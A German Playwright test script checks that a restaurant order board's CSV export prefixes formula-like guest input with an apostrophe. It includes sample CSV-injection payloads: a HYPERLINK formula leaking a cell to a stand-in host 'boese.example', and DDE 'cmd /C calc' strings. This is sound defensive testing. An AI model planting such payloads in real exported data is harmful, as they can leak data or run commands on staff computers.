/* ═══════════════════════════════════════════════════════════════════
   PRÜFUNG · CSV-Export im Board führt keine Formeln aus

     NODE_PATH=$(npm root -g) node pruefungen/pruef-csv-schutz.js

   Anlass (Sicherheits-Sweep 19.10.): Gast-Notiz (bis 500 Zeichen) und
   Gastname bei Lieferung landen unverändert in „Als Datei sichern“.
   Eine Zelle, die mit = + - @ beginnt, führt Excel als Formel aus
   (HYPERLINK, DDE). Der Gast schreibt, das Personal öffnet.

   Gemessen wird die ERZEUGTE Datei des echten Knopfs, nicht die
   Hilfsfunktion: jede Zelle der Datei, die mit einem Formelzeichen
   beginnt, ist ein Befund. Gegenfälle: Telefonnummer und Text bleiben.
   Ehrliche Grenze: Ob ein Excel die Zelle ausführt, ist nicht gemessen —
   gemessen ist, dass keine Zelle mehr mit einem Formelzeichen beginnt.
   ═══════════════════════════════════════════════════════════════════ */
const { chromium } = require("playwright");
const path = require("path");
let n = 0, f = 0;
const pruef = (g, t, z) => { n++; if(!g) f++; console.log((g ? "  ok   " : "  FEHL ") + t + (z !== undefined ? "  → " + z : "")); };
const SEITE = process.env.ADMIN_DATEI || path.join(__dirname, "..", "seiten", "admin.html");

(async () => {
  const br = await chromium.launch();
  const s = await br.newPage({ viewport: { width: 1280, height: 900 } });
  await s.route("**/*", r => r.request().url().startsWith("file://") ? r.continue() : r.abort());
  await s.goto("file://" + SEITE); await s.waitForTimeout(700);
  await s.evaluate(() => { document.getElementById("tor").hidden = true; demoStarten(); const sch = document.getElementById("scharf"); if(sch) sch.hidden = true; });
  await s.waitForTimeout(400);
  const csv = await s.evaluate(async () => {
    window.__blobs = []; const o = URL.createObjectURL; URL.createObjectURL = b => { window.__blobs.push(b); return o.call(URL, b); };
    HTMLAnchorElement.prototype.click = function(){};
    bestellungen.length = 0;
    const zeile = (id, extra) => Object.assign({ id, betrieb_id:"B", quelle:"lieferung", status:"neu", tisch:null, summe:5,
      positionen:[{ name:"Cola", menge:1, preis:5 }], zeitpunkt:new Date().toISOString(), pruefen:false }, extra);
    bestellungen.push(zeile("c1", { gast_name:'=HYPERLINK("https://boese.example/?d="&A1,"Klick")', notiz:"=cmd|' /C calc'!A0", gast_telefon:"+49 6422 4030004" }));
    bestellungen.push(zeile("c2", { gast_name:"@SUM(1+1)", notiz:"+cmd|' /C calc'!A0", gast_telefon:"-1+2" }));
    bestellungen.push(zeile("c3", { gast_name:"Anna", notiz:"ohne Zwiebeln", gast_telefon:"0151 234567" }));
    bestellungen.push(zeile("c4", { gast_name:"\\tTab", notiz:"\\rZeilenumbruch", gast_telefon:"" }));
    Object.keys(zeigeStatus).forEach(k => zeigeStatus[k] = true); Object.keys(zeigeQuelle).forEach(k => zeigeQuelle[k] = true);
    FELDER.forEach(f => f.an = true);
    document.getElementById("csvKnopf").onclick();
    return window.__blobs.length ? await window.__blobs[0].text() : null;
  });
  pruef(csv !== null, "Voraussetzung: der Knopf hat eine Datei erzeugt", csv ? csv.length + " Zeichen" : "KEIN BLOB");
  if(csv){
    const zellen = csv.replace(/^﻿/, "").split(/\r\n/).slice(1).flatMap(z => z.match(/"(?:[^"]|"")*"/g) || []).map(z => z.slice(1, -1).replace(/""/g, '"'));
    pruef(zellen.length >= 20, "Voraussetzung: Zellen gelesen", zellen.length);
    const roh = ['=HYPERLINK', "=cmd", "@SUM", "+cmd"].filter(x => !zellen.some(z => z.includes(x)));
    pruef(!roh.length, "Voraussetzung: die Nutzlasten stehen in der Datei (als Text)", roh.join(",") || "alle");
    const formel = zellen.filter(z => /^[=@+\-\t\r]/.test(z) && !/^[+\-][0-9 ()\/.\-]*$/.test(z));
    pruef(!formel.length, "keine Zelle beginnt mit einem Formelzeichen", formel.slice(0, 2).join(" | ") || "sauber");
    pruef(zellen.includes("+49 6422 4030004") && zellen.includes("0151 234567"), "Telefonnummern bleiben unverändert");
    pruef(zellen.includes("Anna") && zellen.includes("ohne Zwiebeln"), "gewöhnlicher Text bleibt unverändert");
    pruef(zellen.some(z => z === "'=cmd|' /C calc'!A0"), "Formelzelle bekommt ein Apostroph davor (bleibt lesbar)");
  }
  const aw = await s.evaluate(() => ({ a: awCsvFeld("=1+1"), b: awCsvFeld("Pizza"), c: awCsvFeld(12.5) }));
  pruef(aw.a === "'=1+1" && aw.b === "Pizza" && aw.c === "12,50", "Auswertungs-Export (awCsvFeld) schützt ebenso", JSON.stringify(aw));
  await br.close();
  console.log("\n" + (f ? f + " von " + n + " FEHLGESCHLAGEN" : "Alles sauber (" + n + ")"));
  process.exit(f ? 1 : 0);
})();
